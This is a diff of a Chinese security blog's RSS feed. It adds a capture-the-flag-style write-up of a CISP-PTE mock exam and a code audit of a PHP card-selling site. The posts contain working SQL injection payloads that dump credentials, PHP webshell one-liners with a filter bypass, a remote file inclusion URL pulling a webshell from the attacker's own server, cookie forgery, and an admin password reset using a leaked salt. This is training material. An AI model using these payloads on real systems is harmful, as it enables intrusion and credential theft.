@@ -7,7 +7,353 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>Retr0</copyright>
-        <lastBuildDate>Mon, 02 Feb 2026 18:14:46 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 03 Feb 2026 20:40:01 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/categories/26%E5%AF%92%E5%81%87%E9%9B%86%E8%AE%AD/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>2.3-SP PTE模拟全WP</title>
+        <link>https://www.retr0.xyz/p/2.3-sp-pte%E6%A8%A1%E6%8B%9F%E5%85%A8wp/</link>
+        <pubDate>Tue, 03 Feb 2026 20:40:01 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/2.3-sp-pte%E6%A8%A1%E6%8B%9F%E5%85%A8wp/</guid>
+        <description>&lt;h2 id=&#34;试题一sql注入&#34;&gt;试题一：sql注入
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;心路历程：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;随便注册一个账号发现在文章的发表界面有提示，立刻联想到是insert注入，先输入正常的标题和内容提交后返回了执行的insert语句，遂开始尝试注入，过程基本和&lt;a class=&#34;link&#34; href=&#34;https://www.retr0.xyz/p/2.1-%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;2.1 综合练习&lt;/a&gt;中一致，甚至要更简单。&lt;/p&gt;
+&lt;p&gt;但是我浪费了好几分钟，发现是单词拼错了。。。😵&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Write up：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;123&amp;#39;,&amp;#39;haha&amp;#39;),(&amp;#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9&amp;#39;,database(),&amp;#39;test
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//2web
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;123&amp;#39;,&amp;#39;haha&amp;#39;),(&amp;#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9&amp;#39;,(select
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;group_concat(table_name) from information_schema.tables where
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;table_schema=database()),&amp;#39;test
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//article,article1, users1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;123&amp;#39;,&amp;#39;haha&amp;#39;),(&amp;#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9&amp;#39;,(select
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;group_concat(column_name) from information_schema.columns where
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;table_name=&amp;#39;users1&amp;#39; and table_schema=database()),&amp;#39;test
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//username, password
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;123&amp;#39;,&amp;#39;haha&amp;#39;),(&amp;#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9&amp;#39;,(select
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;group_concat(username) from 2web.users1),&amp;#39;test //admin,haha
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;123&amp;#39;,&amp;#39;haha&amp;#39;),(&amp;#39;88CF81EC-5360-DEA7-0E1E-08869D8C63F9&amp;#39;,(select
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;group_concat(password) from 2web.users1),&amp;#39;test
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//key1:u9y8tr4n,202cb962ac59075b964b07152d234b70
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;试题二文件上传&#34;&gt;试题二：文件上传
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;心路历程：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;为了方便干脆直接上图片马吧，反正难得能过简单的肯定也能过，遂打开画图画了个OK保存，然后用notepad++在末尾加上了一句话木马。发现不行，传不上去，woc，这么牛逼吗。经过一波测试，反正最终发现应该是对&lt;code&gt;eval&lt;/code&gt;进行了关键词屏蔽，所以使用大写绕过。传上去正常菜刀/蚁剑连接即可。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Write up：&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php EvAl($_POST[&amp;#39;cmd&amp;#39;]);?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;试题三文件包含&#34;&gt;试题三：文件包含
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;心路历程：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;我是傻逼！&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;最初尝试远程文件包含（用自己博客上提前传好的），猛然醒悟公网肯定没开，所以转而用python开本地服务器。发现攻击机上的居然是远古的python2！然后，然后怎么包含不了啊？那大概是服务端配置关了，换伪协议吧，各种绕过也不行。回到远程文件包含。&lt;/p&gt;
+&lt;p&gt;重点来了，众所周知靶机是内网的一个服务器，而我提交包含文件URL里IP是127.0.0.1，靶机收到参数后理所应当的会在自己本地查找这个文件而不是来我搭建的服务器上找。。。&lt;code&gt;ipconfig&lt;/code&gt;查找到同网段IP后更换一下就行了，依旧菜刀连接拿下。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Write up：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;本地开单独文件夹创建文件&lt;code&gt;niaho.txt&lt;/code&gt;，写入：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?php eval($_POST[&amp;#39;cmd&amp;#39;]);?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;python开服务器：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -m SimpleHTTPServer 8000
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;记得ipconfig看看同网段的IP为&lt;code&gt;127.16.1.87&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;最终的地址为：&lt;code&gt;http://172.16.1.19:83/start/index.php?page=http://172.16.1.87:8000/nihao&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;菜刀连接拿下。&lt;/p&gt;
+&lt;h2 id=&#34;试题四反序列化&#34;&gt;试题四：反序列化
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;心路历程：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;没过脑子把代码抄到本地（OCR太难用了），抄到一般发现是原题，不过就算第一次见也很简单。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Write up：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;见&lt;a class=&#34;link&#34; href=&#34;https://www.retr0.xyz/p/2.1-%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;2.1 综合练习&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;试题五失效的访问控制&#34;&gt;试题五：失效的访问控制
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;心路历程：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;还没来得及抓包服务器就关闭了&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Write up：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;抓包看到了cookie：&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2026/02/03/6981ec083049b.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;把Username的内容先URL解码，再base64解码得到内容：&lt;code&gt;Guest&lt;/code&gt;&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2026/02/03/6981ec08849e6.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;同理我们如法炮制把&lt;code&gt;Admin&lt;/code&gt;先base64编码再URL编码得到&lt;code&gt;%59%57%52%74%61%57%34%3d&lt;/code&gt;换回去就行了&lt;/p&gt;
+&lt;p&gt;注意把前面的IsAdmin的值改为True，放包即可。&lt;/p&gt;
+&lt;h2 id=&#34;参考文献&#34;&gt;参考文献
+&lt;/h2&gt;&lt;p&gt;[1] Echo_200. CISP-PTE练习篇（基础题目五：失效的访问控制）[EB/OL]. (2023-01-31)[2026-02-03]. &lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/wojiaoqwe/article/details/128816906&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://blog.csdn.net/wojiaoqwe/article/details/128816906&lt;/a&gt;.&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>2.3 代码审计</title>
+        <link>https://www.retr0.xyz/p/2.3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</link>
+        <pubDate>Tue, 03 Feb 2026 20:39:40 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/2.3-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</guid>
+        <description>&lt;h2 id=&#34;场景一发卡网站&#34;&gt;场景一：发卡网站
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;后台登录：admin/wuaishare.cn&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;index.php的31行&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;include &#39;template/&#39;.$tp.&#39;/&#39;.$action.&amp;quot;.php&amp;quot;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;有可能文件包含漏洞&lt;/p&gt;
+&lt;hr&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;我点击购买东西，还没付钱，抓到的数据包&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;/ajax.php?act=selKm
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;POST
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;gid=1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我放行之后，点击支付&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;/ajax.php?act=create
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;POST 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;out_trade_no=2026131049390902&amp;amp;gid=1&amp;amp;money=5&amp;amp;rel=123123123&amp;amp;type=wxpay&amp;amp;number=1
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;此时后台可以看到&lt;/p&gt;
+&lt;hr&gt;
+&lt;ol start=&#34;3&#34;&gt;
+&lt;li&gt;发现ajax.php的42行&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;$out_trade_no = $_POST[&#39;out_trade_no&#39;];&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;参数没有进行过滤&lt;/p&gt;
+&lt;hr&gt;
+&lt;ol start=&#34;4&#34;&gt;
+&lt;li&gt;发现56行利用了&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$sql&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;insert into if_order(out_trade_no,gid,money,rel,benTime,type,number) 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;         values(&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$out_trade_no&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;,&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$gid&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$money&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$rel&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;,now(),&amp;#39;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$type&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#39;,&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$number&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;)&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;有可能出现sql注入&lt;/p&gt;
+&lt;hr&gt;
+&lt;ol start=&#34;5&#34;&gt;
+&lt;li&gt;管理员通过admin/list.php &lt;strong&gt;（存储型XSS：可行）&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;看到订单号&lt;/p&gt;
+&lt;p&gt;136行发现&lt;code&gt;$res[&#39;out_trade_no&#39;]&lt;/code&gt;直接从数据库取出，没有做任何过滤就放到了管理员面前&lt;/p&gt;
+&lt;p&gt;和上面漏洞结合，有可能出现xss盲打 &lt;strong&gt;（实测有长度限制）&lt;/strong&gt; ，但是正常进行较短语句的XSS存储型注入是没有问题 的。&lt;/p&gt;
+&lt;hr&gt;
+&lt;ol start=&#34;6&#34;&gt;
+&lt;li&gt;admin/ajax.php &lt;strong&gt;（纵向越权：可行）&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;27行发现&lt;code&gt;$pass = md5($pass.$password_hash);&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;发现密码加盐了，也就是在用户输入的密码后拼接一串字符串后再加密，因为开头引入了&lt;code&gt;commom.php&lt;/code&gt;遂检查&lt;/p&gt;
+&lt;p&gt;发现common.php的34行&lt;code&gt;$password_hash=&#39;!@#%!s!8#&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;159行发现&lt;code&gt;case &#39;upAdmin&#39;:&lt;/code&gt; 用来修改管理员密码&lt;/p&gt;
+&lt;p&gt;如果发送的case内容为upAdmin并且用户名admin密码为123456!@#%!s!8#并且进行md5，也就是f3b4e3b975e0484835e90514f8318e61&lt;/p&gt;
+&lt;p&gt;提交到admin/ajax.php，会直接越权修改管理员密码，&lt;strong&gt;遂尝试：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;直接去访问&lt;code&gt;/admin/ajax.php?act=upAdmin&lt;/code&gt;出现页面非法请求&lt;/p&gt;
+&lt;p&gt;因为&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;HTTP_X_REQUESTED_WITH&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;XMLHttpRequest&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;页面非法请求！&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;必须修改为POST包&lt;/p&gt;
+&lt;p&gt;在请求的header上加上&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;X-Requested-With:XMLHttpRequest&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;还需要加上&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;Content-Type: application/x-www-form-urlencoded&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;否则参数无法被识别的&lt;/p&gt;
+&lt;p&gt;建议使用Chrome版的Hackbar，附最终效果：&lt;/p&gt;
+&lt;!-- 这是一张图片，ocr 内容为： --&gt;
+&lt;p&gt;&lt;img src=&#34;https://free.picui.cn/free/2026/02/03/6981ecde0af4a.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;ol start=&#34;7&#34;&gt;
+&lt;li&gt;在&lt;code&gt;admin/clist.php&lt;/code&gt;发现文件上传 &lt;strong&gt;（文件上传：可行）&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;code&gt;$imgs =  upimgs($_FILES[&#39;img&#39;]);&lt;/code&gt;在24行&lt;/p&gt;
+&lt;p&gt;全局搜索upimgs函数&lt;/p&gt;
+&lt;p&gt;发现&lt;code&gt;if/function.php&lt;/code&gt;的141行发现这个函数&lt;/p&gt;
+&lt;p&gt;发现文件上传路径&lt;code&gt;../assets/goodsimg/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;需要做mime检测&lt;/p&gt;
+&lt;p&gt;文件命名规则 &lt;code&gt;当前时间.后缀名&lt;/code&gt;&lt;/p&gt;
